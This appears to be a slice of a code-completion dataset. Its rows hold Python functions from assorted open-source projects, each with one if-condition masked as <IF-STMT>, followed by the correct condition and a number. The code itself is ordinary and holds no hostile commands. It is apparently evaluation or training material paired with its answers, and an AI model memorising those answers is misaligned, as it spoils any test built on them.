2346,"def addInt(self, intval, width, nodeinfo):<tab>node = self.basenode<tab>for sh in range(width - 1, -1, -1):<tab><tab>choice = (intval >> sh) & 1<tab><tab><IF-STMT><tab><tab><tab>node[choice] = [None, None, None]<tab><tab>node = node[choice]<tab>node[2] = nodeinfo",if node [ choice ] is None :,98
2347,"def add_cand(cands):<tab>cands = [cand.creator for cand in cands if cand.creator is not None]<tab>for x in cands:<tab><tab>if x in seen_set:<tab><tab><tab>continue<tab><tab>order = 1<tab><tab><IF-STMT><tab><tab><tab>order = -len(seen_set)<tab><tab># Negate since heapq is min-heap<tab><tab># `len(seen_set)` is in order to avoid comparing `x`<tab><tab>heapq.heappush(cand_funcs, (order, -x.rank, -len(seen_set), x))<tab><tab>seen_set.add(x)",if fan_out [ x ] == 1 and len ( cands ) == 1 :,167
2348,"def indentSelection(self, howFar=4):<tab># Indent or outdent current selection by 'howFar' spaces<tab># (which could be positive or negative int).<tab>startLineNum = self.LineFromPosition(self.GetSelectionStart())<tab>endLineNum = self.LineFromPosition(self.GetSelectionEnd())<tab># go through line-by-line<tab>self.BeginUndoAction()<tab>for lineN in range(startLineNum, endLineNum + 1):<tab><tab>newIndent = self.GetLineIndentation(lineN) + howFar<tab><tab><IF-STMT><tab><tab><tab>newIndent = 0<tab><tab>self.SetLineIndentation(lineN, newIndent)<tab>self.EndUndoAction()",if newIndent < 0 :,179
2349,"def request(self, host, handler, request_body, verbose=False):<tab># retry request once if cached connection has gone cold<tab>for i in (0, 1):<tab><tab>try:<tab><tab><tab>return self.single_request(host, handler, request_body, verbose)<tab><tab>except socket.error as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>except http_client.BadStatusLine:  # close after we sent request<tab><tab><tab>if i:<tab><tab><tab><tab>raise","if i or e . errno not in ( errno . ECONNRESET , errno . ECONNABORTED , errno . EPIPE ) :",147
2350,"def update_data(self, change):<tab>self.mark.x = self.state.x_centers<tab>y0 = self.state.grid<tab><IF-STMT><tab><tab>y0 = y0 / np.sum(y0)<tab>if self.state.grid_sliced is not None:<tab><tab>y1 = self.state.grid_sliced<tab><tab>if self.normalize:<tab><tab><tab>y1 = y1 / np.sum(y1)<tab><tab>self.mark.y = np.array([y0, y1])<tab><tab>self.mark.colors = [C0, C1]<tab><tab>self.mark.type = ""grouped""<tab>else:<tab><tab>self.mark.y = y0<tab><tab>self.mark.colors = [C0]",if self . normalize :,185
2351,"def visit_body(self, nodes):<tab>new_nodes = []<tab>count = 0<tab>for node in nodes:<tab><tab>rewriter = IfExpRewriter(count)<tab><tab>possibly_transformed_node = rewriter.visit(node)<tab><tab><IF-STMT><tab><tab><tab>new_nodes.extend(rewriter.assignments)<tab><tab><tab>count += len(rewriter.assignments)<tab><tab>new_nodes.append(possibly_transformed_node)<tab>return new_nodes",if rewriter . assignments :,110
2352,"def byteRegOffset(self, val, prefixes=0):<tab># NOTE: Override this because there is no AH etc in 64 bit mode<tab>if prefixes & PREFIX_REX:  # the parse_modrm function deals with register index adds<tab><tab>val |= e_i386.RMETA_LOW8<tab>else:  # not using REX, revert to old split-registers (low/high)<tab><tab><IF-STMT><tab><tab><tab>val |= e_i386.RMETA_LOW8<tab><tab>else:<tab><tab><tab>val |= e_i386.RMETA_HIGH8<tab><tab><tab>val -= 4<tab>return val",if val < 4 :,148
2353,"def gprv_immv(ii):<tab>for i, op in enumerate(_gen_opnds(ii)):<tab><tab><IF-STMT><tab><tab><tab>if op.name == ""REG0"" and op_luf_start(op, ""GPRv""):<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>elif i == 1:<tab><tab><tab>if op_immv(op):<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return False<tab>return True",if i == 0 :,136
2354,"def normalize(self):<tab>self.pairs.sort()<tab>i = 1<tab>while i < len(self.pairs):<tab><tab>alo, ahi = self.pairs[i - 1]<tab><tab>blo, bhi = self.pairs[i]<tab><tab><IF-STMT><tab><tab><tab>self.pairs[i - 1 : i + 1] = [(alo, max(ahi, bhi))]<tab><tab>else:<tab><tab><tab>i = i + 1",if ahi >= blo - 1 :,115
2355,"def __substitute_composite_key(self, key, composite_file, dataset=None):<tab>if composite_file.substitute_name_with_metadata:<tab><tab><IF-STMT><tab><tab><tab>meta_value = str(<tab><tab><tab><tab>dataset.metadata.get(composite_file.substitute_name_with_metadata)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>meta_value = self.spec[composite_file.substitute_name_with_metadata].default<tab><tab>return key % meta_value<tab>return key",if dataset :,123
2356,"def cb(definition):<tab>if len(definition.strip()) == 0:<tab><tab><IF-STMT><tab><tab><tab>dialog = wx.MessageDialog(<tab><tab><tab><tab>self,<tab><tab><tab><tab>_(""Do you want to erase the macro?""),<tab><tab><tab><tab>style=wx.YES_NO | wx.YES_DEFAULT | wx.ICON_QUESTION,<tab><tab><tab>)<tab><tab><tab>if dialog.ShowModal() == wx.ID_YES:<tab><tab><tab><tab>self.delete_macro(macro_name)<tab><tab><tab><tab>return<tab><tab>self.log(_(""Cancelled.""))<tab><tab>return<tab>self.cur_macro_name = macro_name<tab>self.cur_macro_def = definition<tab>self.end_macro()","if old_macro_definition != """" :",176
2357,"def process_request(self, request):<tab>for old, new in self.names_name:<tab><tab>request.uri = request.uri.replace(old, new)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>body = (<tab><tab><tab><tab><tab>str(request.body, ""utf-8"")<tab><tab><tab><tab><tab>if isinstance(request.body, bytes)<tab><tab><tab><tab><tab>else str(request.body)<tab><tab><tab><tab>)<tab><tab><tab>except TypeError:  # python 2 doesn't allow decoding through str<tab><tab><tab><tab>body = str(request.body)<tab><tab><tab>if old in body:<tab><tab><tab><tab>request.body = body.replace(old, new)<tab>return request",if is_text_payload ( request ) and request . body :,182
2358,"def writeLibraryControllers(fp, human, meshes, skel, config, shapes=None):<tab>progress = Progress(len(meshes), None)<tab>fp.write(""\n  <library_controllers>\n"")<tab>for mIdx, mesh in enumerate(meshes):<tab><tab>subprog = Progress()(0, 0.5)<tab><tab><IF-STMT><tab><tab><tab>writeSkinController(fp, human, mesh, skel, config)<tab><tab>subprog(0.5, 1)<tab><tab>if shapes is not None:<tab><tab><tab>writeMorphController(fp, mesh, shapes[mIdx], config)<tab><tab>progress.step()<tab>fp.write(""  </library_controllers>\n"")",if skel :,172
2359,def checkpoint():<tab>if checkpoint_asserts:<tab><tab>self.assert_integrity_idxs_take()<tab><tab><IF-STMT><tab><tab><tab>toposort(self.idxs_memo[node])<tab><tab>if node in self.take_memo:<tab><tab><tab>for take in self.take_memo[node]:<tab><tab><tab><tab>toposort(take),if node in self . idxs_memo :,86
2360,"def __virtual__():  # pylint: disable=expected-2-blank-lines-found-0<tab>try:<tab><tab>global __salt__  # pylint: disable=global-statement<tab><tab><IF-STMT><tab><tab><tab>__salt__ = salt.loader.minion_mods(__opts__)<tab><tab><tab>return True<tab>except Exception as e:  # pylint: disable=broad-except<tab><tab>log.error(""Could not load __salt__: %s"", e)<tab><tab>return False",if not __salt__ :,118
2361,"def annotate_disk_for_smart(middleware, devices, disk):<tab>args = await get_smartctl_args(middleware, devices, disk)<tab>if args:<tab><tab><IF-STMT><tab><tab><tab>args.extend([""-a""])<tab><tab><tab>args.extend([""-d"", ""removable""])<tab><tab><tab>return disk, dict(smartctl_args=args)",if await ensure_smart_enabled ( args ) :,93
2362,"def make_connection(self, host):<tab>h, eh, kwargs = self.get_host_info(host)<tab>if not kwargs:<tab><tab>kwargs = {}<tab>kwargs[""timeout""] = self.timeout<tab>if _ver_info == (2, 6):<tab><tab>result = HTTPS(host, None, **kwargs)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self._extra_headers = eh<tab><tab><tab>self._connection = host, httplib.HTTPSConnection(h, None, **kwargs)<tab><tab>result = self._connection[1]<tab>return result",if not self . _connection or host != self . _connection [ 0 ] :,149
2363,"def get_base_types(self, cdef: ClassDef) -> List[str]:<tab>""""""Get list of base classes for a class.""""""<tab>base_types = []  # type: List[str]<tab>for base in cdef.base_type_exprs:<tab><tab>if isinstance(base, NameExpr):<tab><tab><tab>if base.name != ""object"":<tab><tab><tab><tab>base_types.append(base.name)<tab><tab><IF-STMT><tab><tab><tab>modname = get_qualified_name(base.expr)<tab><tab><tab>base_types.append(""%s.%s"" % (modname, base.name))<tab><tab>elif isinstance(base, IndexExpr):<tab><tab><tab>p = AliasPrinter(self)<tab><tab><tab>base_types.append(base.accept(p))<tab>return base_types","elif isinstance ( base , MemberExpr ) :",187
2364,"def add_entry(self, entry):<tab># type: (...) -> None<tab>version = entry.as_python  # type: PythonVersion<tab>if version:<tab><tab>_ = self.versions[version.version_tuple]<tab><tab>paths = {p.path for p in self.versions.get(version.version_tuple, [])}<tab><tab><IF-STMT><tab><tab><tab>self.versions[version.version_tuple].append(entry)",if entry . path not in paths :,108
2365,"def check(self):<tab>global MySQLdb<tab>import MySQLdb<tab>try:<tab><tab>args = {}<tab><tab>if mysql_user:<tab><tab><tab>args[""user""] = mysql_user<tab><tab>if mysql_pwd:<tab><tab><tab>args[""passwd""] = mysql_pwd<tab><tab>if mysql_host:<tab><tab><tab>args[""host""] = mysql_host<tab><tab>if mysql_port:<tab><tab><tab>args[""port""] = mysql_port<tab><tab><IF-STMT><tab><tab><tab>args[""unix_socket""] = mysql_socket<tab><tab>self.db = MySQLdb.connect(**args)<tab>except Exception as e:<tab><tab>raise Exception(""Cannot interface with MySQL server: %s"" % e)",if mysql_socket :,167
2366,"def findsection(self, key):<tab>to_return = copy.deepcopy(self)<tab>for subsection in to_return:<tab><tab>try:<tab><tab><tab>value = list(ConfigObj.find_key(to_return[subsection], key))[0]<tab><tab>except Exception:<tab><tab><tab>value = None<tab><tab>if not value:<tab><tab><tab>del to_return[subsection]<tab><tab>else:<tab><tab><tab>for category in to_return[subsection]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>del to_return[subsection][category]<tab># cleanout empty sections and subsections<tab>for key in [k for (k, v) in to_return.items() if not v]:<tab><tab>del to_return[key]<tab>return to_return",if category != key :,189
2367,"def get_ready_conn(self, host):<tab>conn = None<tab>self._lock.acquire()<tab>try:<tab><tab><IF-STMT><tab><tab><tab>for c in self._hostmap[host]:<tab><tab><tab><tab>if self._readymap[c]:<tab><tab><tab><tab><tab>self._readymap[c] = 0<tab><tab><tab><tab><tab>conn = c<tab><tab><tab><tab><tab>break<tab>finally:<tab><tab>self._lock.release()<tab>return conn",if host in self . _hostmap :,115
2368,"def assign_set_scope(<tab>ir_set: irast.Set,<tab>scope: Optional[irast.ScopeTreeNode],<tab>*,<tab>ctx: context.ContextLevel) -> irast.Set:<tab>if scope is None:<tab><tab>ir_set.path_scope_id = None<tab>else:<tab><tab><IF-STMT><tab><tab><tab>scope.unique_id = ctx.scope_id_ctr.nextval()<tab><tab>ir_set.path_scope_id = scope.unique_id<tab><tab>if scope.find_child(ir_set.path_id):<tab><tab><tab>raise RuntimeError(""scoped set must not contain itself"")<tab>return ir_set",if scope . unique_id is None :,166
2369,"def _flatten(*args):<tab>arglist = []<tab>for arg in args:<tab><tab>if isinstance(arg, _Block):<tab><tab><tab>if arg.vhdl_code is not None:<tab><tab><tab><tab>arglist.append(arg.vhdl_code)<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>arg = arg.subs<tab><tab><IF-STMT><tab><tab><tab>arglist.append(_userCodeMap[""vhdl""][id(arg)])<tab><tab>elif isinstance(arg, (list, tuple, set)):<tab><tab><tab>for item in arg:<tab><tab><tab><tab>arglist.extend(_flatten(item))<tab><tab>else:<tab><tab><tab>arglist.append(arg)<tab>return arglist","if id ( arg ) in _userCodeMap [ ""vhdl"" ] :",179
2370,"def _prepare_expected(data, lags, trim=""front""):<tab>t, k = data.shape<tab>expected = np.zeros((t + lags, (lags + 1) * k))<tab>for col in range(k):<tab><tab>for i in range(lags + 1):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>expected[i : -lags + i, (lags + 1) * col + i] = data[:, col]<tab><tab><tab>else:<tab><tab><tab><tab>expected[i:, (lags + 1) * col + i] = data[:, col]<tab>if trim == ""front"":<tab><tab>expected = expected[:-lags]<tab>return expected",if i < lags :,163
2371,"def test_class_based_views_inherit_from_acl_gateway_class(self):<tab>for urlpattern in self.urlpatterns_to_test:<tab><tab>callback_name = urlpattern.callback.__name__<tab><tab>module_name = urlpattern.callback.__module__<tab><tab>if (callback_name, module_name) in self.excluded_callbacks:<tab><tab><tab>continue<tab><tab>imported_module = __import__(module_name, fromlist=[callback_name])<tab><tab>found_callback = getattr(imported_module, callback_name)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>msg = ""Class '{}' does not inherit from 'ACLGateway' "" ""class."".format(<tab><tab><tab>found_callback<tab><tab>)<tab><tab>self.assertTrue(issubclass(found_callback, ACLGateway), msg)",if not inspect . isclass ( found_callback ) :,195
2372,"def generateMapItemTypedNode(self, key, value):<tab>if type(value) == SigmaRegularExpressionModifier:<tab><tab>regex = str(value)<tab><tab># Regular Expressions have to match the full value in QRadar<tab><tab><IF-STMT><tab><tab><tab>regex = "".*"" + regex<tab><tab>if not (regex.endswith(""$"") or regex.endswith("".*"")):<tab><tab><tab>regex = regex + "".*""<tab><tab>return ""%s MATCHES %s"" % (self.cleanKey(key), self.generateValueNode(regex))<tab>else:<tab><tab>raise NotImplementedError(<tab><tab><tab>""Type modifier '{}' is not supported by backend"".format(value.identifier)<tab><tab>)","if not ( regex . startswith ( ""^"" ) or regex . startswith ( "".*"" ) ) :",165
2373,"def __str__(self):<tab>_outicalfile = self._icalfile<tab>for unit in self.units:<tab><tab>for location in unit.getlocations():<tab><tab><tab>match = re.match(""\\[(?P<uid>.+)\\](?P<property>.+)"", location)<tab><tab><tab>for component in self._icalfile.components():<tab><tab><tab><tab>if component.name != ""VEVENT"":<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>for property in component.getChildren():<tab><tab><tab><tab><tab>if property.name == match.groupdict()[""property""]:<tab><tab><tab><tab><tab><tab>property.value = unit.target<tab>if _outicalfile:<tab><tab>return str(_outicalfile.serialize())<tab>else:<tab><tab>return """"","if component . uid . value != match . groupdict ( ) [ ""uid"" ] :",198
2374,"def __init__(self, items):<tab>self._format = string.join(map(lambda item: item[0], items), """")<tab>self._items = items<tab>self._buffer_ = win32wnet.NCBBuffer(struct.calcsize(self._format))<tab>for format, name in self._items:<tab><tab><IF-STMT><tab><tab><tab>if format == ""c"":<tab><tab><tab><tab>val = ""\0""<tab><tab><tab>else:<tab><tab><tab><tab>val = 0<tab><tab>else:<tab><tab><tab>l = int(format[:-1])<tab><tab><tab>val = ""\0"" * l<tab><tab>self.__dict__[name] = val",if len ( format ) == 1 :,158
2375,"def __init__(self, learners, names=None):<tab>self.learners = learners<tab>for i, learner in enumerate(learners):<tab><tab>self.update_set_reward(learner)<tab><tab>learner.accumulated_rewards = []<tab><tab>learner.known_states = []<tab><tab>learner.temperatures = []<tab><tab><IF-STMT><tab><tab><tab>learner.name = ""Learner %d"" % i<tab><tab>else:<tab><tab><tab>learner.name = names[i]",if names is None :,120
2376,"def __init__(self, *args, **kwargs):<tab>self.default_currency = kwargs.pop(""default_currency"", None)<tab>super().__init__(*args, **kwargs)<tab># Rest Framework converts `min_value` / `max_value` to validators, that are not aware about `Money` class<tab># We need to adjust them<tab>for idx, validator in enumerate(self.validators):<tab><tab><IF-STMT><tab><tab><tab>self.validators[idx] = MinMoneyValidator(self.min_value)<tab><tab>elif isinstance(validator, MaxValueValidator):<tab><tab><tab>self.validators[idx] = MaxMoneyValidator(self.max_value)","if isinstance ( validator , MinValueValidator ) :",159
2377,"def add_line_taxes(self, lines):<tab>for line in lines:<tab><tab><IF-STMT><tab><tab><tab>continue  # Cannot have taxes, since not in source<tab><tab>for (index, line_tax) in enumerate(line.source_line.taxes, 1):<tab><tab><tab>line.taxes.create(<tab><tab><tab><tab>tax=line_tax.tax,<tab><tab><tab><tab>name=line_tax.name,<tab><tab><tab><tab>amount_value=line_tax.amount.value,<tab><tab><tab><tab>base_amount_value=line_tax.base_amount.value,<tab><tab><tab><tab>ordering=index,<tab><tab><tab>)",if not line . source_line :,157
2378,"def linesub(match):<tab>line = match.group()<tab>for token in TOKEN_RE.findall(line):<tab><tab>if token in names:<tab><tab><tab>targets = names[token]<tab><tab><tab>fdist.inc(token)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>log.warning(<tab><tab><tab><tab><tab>""%s is ambiguous: %s""<tab><tab><tab><tab><tab>% (token, "", "".join(str(v.canonical_name) for v in names[token]))<tab><tab><tab><tab>)<tab><tab><tab>line += INDEXTERM % token<tab><tab><tab># line += INDEXTERM % names[token][0].canonical_name<tab>return line",if len ( targets ) > 1 :,159
2379,"def ask(self) -> Dict[str, Any]:<tab>params = {}<tab>param_values = self._optimizer.ask()<tab>for (name, distribution), value in zip(<tab><tab>sorted(self._search_space.items()), param_values<tab>):<tab><tab>if isinstance(distribution, distributions.DiscreteUniformDistribution):<tab><tab><tab>value = value * distribution.q + distribution.low<tab><tab><IF-STMT><tab><tab><tab>value = value * distribution.step + distribution.low<tab><tab>if isinstance(distribution, distributions.IntLogUniformDistribution):<tab><tab><tab>value = int(np.round(value))<tab><tab><tab>value = min(max(value, distribution.low), distribution.high)<tab><tab>params[name] = value<tab>return params","if isinstance ( distribution , distributions . IntUniformDistribution ) :",180
2380,"def fetcher():<tab>while True:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>self.fetch()<tab><tab><tab>self._cluster.handler.sleep(0.01)<tab><tab>except ReferenceError:<tab><tab><tab>break<tab><tab>except Exception:<tab><tab><tab># surface all exceptions to the main thread<tab><tab><tab>self._worker_exception = sys.exc_info()<tab><tab><tab>break<tab>try:<tab><tab>self.cleanup()<tab>except ReferenceError as e:<tab><tab>log.debug(""Attempt to cleanup consumer failed with ReferenceError"")<tab>log.debug(""Fetcher thread exiting"")",if not self . _running :,148
2381,"def write_text(self, text):<tab>""""""Writes re-indented text into the buffer.""""""<tab>should_indent = False<tab>rows = []<tab>for row in text.split(""\n""):<tab><tab>if should_indent:<tab><tab><tab>row = ""<tab>{}"".format(row)<tab><tab><IF-STMT><tab><tab><tab>row = row.replace(""\b"", """", 1)<tab><tab><tab>should_indent = True<tab><tab>elif not len(row.strip()):<tab><tab><tab>should_indent = False<tab><tab>rows.append(row)<tab>self.write(""{}\n"".format(""\n"".join(rows)))","if ""\b"" in row :",147
2382,"def test_kafka_consumer(self):<tab>self.send_messages(0, range(0, 100))<tab>self.send_messages(1, range(100, 200))<tab># Start a consumer<tab>consumer = self.kafka_consumer(auto_offset_reset=""earliest"")<tab>n = 0<tab>messages = {0: set(), 1: set()}<tab>for m in consumer:<tab><tab>logging.debug(""Consumed message %s"" % repr(m))<tab><tab>n += 1<tab><tab>messages[m.partition].add(m.offset)<tab><tab><IF-STMT><tab><tab><tab>break<tab>self.assertEqual(len(messages[0]), 100)<tab>self.assertEqual(len(messages[1]), 100)",if n >= 200 :,180
2383,"def get_command(scaffolding, command_path):<tab>path, _, command_name = command_path.rpartition(""."")<tab>if path not in scaffolding:<tab><tab>raise KeyError('Ingredient for command ""%s"" not found.' % command_path)<tab>if command_name in scaffolding[path].commands:<tab><tab>return scaffolding[path].commands[command_name]<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise KeyError(<tab><tab><tab><tab>'Command ""%s"" not found in ingredient ""%s""' % (command_name, path)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>raise KeyError('Command ""%s"" not found' % command_name)",if path :,167
2384,"def build_extension(self, ext):<tab>ext._convert_pyx_sources_to_lang()<tab>_compiler = self.compiler<tab>try:<tab><tab><IF-STMT><tab><tab><tab>self.compiler = self.shlib_compiler<tab><tab>_build_ext.build_extension(self, ext)<tab><tab>if ext._needs_stub:<tab><tab><tab>cmd = self.get_finalized_command(""build_py"").build_lib<tab><tab><tab>self.write_stub(cmd, ext)<tab>finally:<tab><tab>self.compiler = _compiler","if isinstance ( ext , Library ) :",134
2385,"def _send_payload(self, payload):<tab>req = eventlet_urllib2.Request(self._url, headers=payload[1])<tab>try:<tab><tab><IF-STMT><tab><tab><tab>response = eventlet_urllib2.urlopen(req, payload[0]).read()<tab><tab>else:<tab><tab><tab>response = eventlet_urllib2.urlopen(req, payload[0], self.timeout).read()<tab><tab>return response<tab>except Exception as err:<tab><tab>return err","if sys . version_info < ( 2 , 6 ) :",122
2386,"def get_access_token(self, callback):<tab>if not self.is_authorized():<tab><tab>callback(None)<tab>else:<tab><tab>access_token = config.persist[""oauth_access_token""]<tab><tab>access_token_expires = config.persist[""oauth_access_token_expires""]<tab><tab><IF-STMT><tab><tab><tab>callback(access_token)<tab><tab>else:<tab><tab><tab>self.forget_access_token()<tab><tab><tab>self.refresh_access_token(callback)",if access_token and time . time ( ) < access_token_expires :,131
2387,"def mark_first_parents(event):<tab>""""""Mark the node and all its parents.""""""<tab>c = event.get(""c"")<tab>if not c:<tab><tab>return<tab>changed = []<tab>for parent in c.p.self_and_parents():<tab><tab><IF-STMT><tab><tab><tab>parent.v.setMarked()<tab><tab><tab>parent.setAllAncestorAtFileNodesDirty()<tab><tab><tab>changed.append(parent.copy())<tab>if changed:<tab><tab># g.es(""marked: "" + ', '.join([z.h for z in changed]))<tab><tab>c.setChanged()<tab><tab>c.redraw()<tab>return changed",if not parent . isMarked ( ) :,162
2388,"def normalize_reg_path(self, path):<tab>new = path<tab>if path:<tab><tab>roots = (""\\registry\\machine\\"", ""hklm\\"")<tab><tab>for r in roots:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>new = ""HKEY_LOCAL_MACHINE\\"" + path[len(r) :]<tab><tab><tab><tab>return new<tab>return path",if path . lower ( ) . startswith ( r ) :,94
2389,"def extract_labels(filename, one_hot=False):<tab>""""""Extract the labels into a 1D uint8 numpy array [index].""""""<tab>print(""Extracting"", filename)<tab>with gzip.open(filename) as bytestream:<tab><tab>magic = _read32(bytestream)<tab><tab>if magic != 2049:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Invalid magic number %d in MNIST label file: %s"" % (magic, filename)<tab><tab><tab>)<tab><tab>num_items = _read32(bytestream)<tab><tab>buf = bytestream.read(num_items)<tab><tab>labels = numpy.frombuffer(buf, dtype=numpy.uint8)<tab><tab><IF-STMT><tab><tab><tab>return dense_to_one_hot(labels)<tab><tab>return labels",if one_hot :,180
2390,"def on_change(self, data):<tab># loop over tp_clipboard views<tab>for window in sublime.windows():<tab><tab>for view in window.views():<tab><tab><tab>if view.get_status(""inactive"") and view.settings().get(""tp_append"", False):<tab><tab><tab><tab>file_name = view.file_name()<tab><tab><tab><tab># ammo<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.update(view)<tab><tab><tab><tab>elif file_name and file_name.endswith(<tab><tab><tab><tab><tab>global_settings(""ammo_file_extension"", "".ammo"")<tab><tab><tab><tab>):<tab><tab><tab><tab><tab>self.update(view)","if view . settings ( ) . get ( ""tp_ammo"" , False ) :",175
2391,"def list(self, items, columns=4, width=80):<tab>items = list(sorted(items))<tab>colw = width // columns<tab>rows = (len(items) + columns - 1) // columns<tab>for row in range(rows):<tab><tab>for col in range(columns):<tab><tab><tab>i = col * rows + row<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.output.write(items[i])<tab><tab><tab><tab>if col < columns - 1:<tab><tab><tab><tab><tab>self.output.write("" "" + "" "" * (colw - 1 - len(items[i])))<tab><tab>self.output.write(""\n"")",if i < len ( items ) :,158
2392,"def test_dynamic_section_solaris(self):<tab>""""""Verify that we can parse relocations from the .dynamic section""""""<tab>test_dir = os.path.join(""test"", ""testfiles_for_unittests"")<tab>with open(os.path.join(test_dir, ""exe_solaris32_cc.elf""), ""rb"") as f:<tab><tab>elff = ELFFile(f)<tab><tab>for sect in elff.iter_sections():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>relos = sect.get_relocation_tables()<tab><tab><tab><tab>self.assertEqual(set(relos), {""JMPREL"", ""REL""})","if isinstance ( sect , DynamicSection ) :",160
2393,"def close(self, checkcount=False):<tab>self.mutex.acquire()<tab>try:<tab><tab>if checkcount:<tab><tab><tab>self.openers -= 1<tab><tab><tab>if self.openers == 0:<tab><tab><tab><tab>self.do_close()<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.do_close()<tab><tab><tab>self.openers = 0<tab>finally:<tab><tab>self.mutex.release()",if self . openers > 0 :,116
2394,def subcommand_table(self):<tab>if self._subcommand_table is None:<tab><tab><IF-STMT><tab><tab><tab>self._topic_tag_db = TopicTagDB()<tab><tab>self._topic_tag_db.load_json_index()<tab><tab>self._subcommand_table = self._create_subcommand_table()<tab>return self._subcommand_table,if self . _topic_tag_db is None :,89
2395,"def layer_init(self):<tab>for layer in self.cnn:  # type: ignore<tab><tab>if isinstance(layer, (nn.Conv2d, nn.Linear)):<tab><tab><tab>nn.init.kaiming_normal_(layer.weight, nn.init.calculate_gain(""relu""))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>nn.init.constant_(layer.bias, val=0)",if layer . bias is not None :,99
2396,"def _append_modifier(code, modifier):<tab>if modifier == ""euro"":<tab><tab>if ""."" not in code:<tab><tab><tab>return code + "".ISO8859-15""<tab><tab>_, _, encoding = code.partition(""."")<tab><tab>if encoding in (""ISO8859-15"", ""UTF-8""):<tab><tab><tab>return code<tab><tab><IF-STMT><tab><tab><tab>return _replace_encoding(code, ""ISO8859-15"")<tab>return code + ""@"" + modifier","if encoding == ""ISO8859-1"" :",115
2397,"def set_mean(self, mean):<tab>if mean is not None:<tab><tab># mean value, may be one value per channel<tab><tab><IF-STMT><tab><tab><tab>mean = mean[:, np.newaxis, np.newaxis]<tab><tab>else:<tab><tab><tab># elementwise mean<tab><tab><tab>if self.is_color:<tab><tab><tab><tab>assert len(mean.shape) == 3<tab>self.mean = mean",if mean . ndim == 1 :,101
2398,"def _set_state(self, value):<tab>if self._pwm:<tab><tab>try:<tab><tab><tab>value = int(value * self._connection.get_PWM_range(self._number))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._connection.set_PWM_dutycycle(self._number, value)<tab><tab>except pigpio.error:<tab><tab><tab>raise PinInvalidState('invalid state ""%s"" for pin %r' % (value, self))<tab>elif self.function == ""input"":<tab><tab>raise PinSetInput(""cannot set state of pin %r"" % self)<tab>else:<tab><tab># write forces pin to OUTPUT, hence the check above<tab><tab>self._connection.write(self._number, bool(value))",if value != self . _connection . get_PWM_dutycycle ( self . _number ) :,192
2399,"def do_stop(self):<tab>logger.info(""[%s] Stopping all workers"", self.name)<tab>for w in self.workers.values():<tab><tab>try:<tab><tab><tab>w.terminate()<tab><tab><tab>w.join(timeout=1)<tab><tab># A already dead worker or in a worker<tab><tab>except (AttributeError, AssertionError):<tab><tab><tab>pass<tab># Close the server socket if it was opened<tab>if self.http_daemon:<tab><tab>if self.brok_interface:<tab><tab><tab>self.http_daemon.unregister(self.brok_interface)<tab><tab><IF-STMT><tab><tab><tab>self.http_daemon.unregister(self.scheduler_interface)<tab># And then call our master stop from satellite code<tab>super(Satellite, self).do_stop()",if self . scheduler_interface :,191
2400,"def iter_input(input, filename, parser, line_by_line):<tab>if isinstance(input, basestring):<tab><tab>with open(input, ""rb"") as f:<tab><tab><tab>for tree in iter_input(f, filename, parser, line_by_line):<tab><tab><tab><tab>yield tree<tab>else:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for line in input:<tab><tab><tab><tab><tab>if line:<tab><tab><tab><tab><tab><tab>yield et.ElementTree(et.fromstring(line, parser))<tab><tab><tab>else:<tab><tab><tab><tab>yield et.parse(input, parser)<tab><tab>except IOError:<tab><tab><tab>e = sys.exc_info()[1]<tab><tab><tab>error(""parsing %r failed: %s: %s"", filename, e.__class__.__name__, e)",if line_by_line :,197
2401,"def debug_print(data: json):<tab>try:<tab><tab>print(""[+] ---Debug info---"")<tab><tab>for i, v in data.items():<tab><tab><tab>if i == ""outline"":<tab><tab><tab><tab>print(""[+]  -"", i, ""<tab>:"", len(v), ""characters"")<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>print(""[+]  -"", ""%-11s"" % i, "":"", v)<tab><tab>print(""[+] ---Debug info---"")<tab>except:<tab><tab>pass","if i == ""actor_photo"" or i == ""year"" :",138
2402,"def deliver_event(self):<tab>while True:<tab><tab>client = self._client()<tab><tab><IF-STMT><tab><tab><tab>return  # weakref is dead, nothing to deliver<tab><tab>diff = self._due - client.loop.time()<tab><tab>if diff <= 0:<tab><tab><tab># We've hit our due time, deliver event. It won't respect<tab><tab><tab># sequential updates but fixing that would just worsen this.<tab><tab><tab>await client._dispatch_event(self._event)<tab><tab><tab>return<tab><tab>del client  # Clear ref and sleep until our due time<tab><tab>await asyncio.sleep(diff)",if client is None :,147
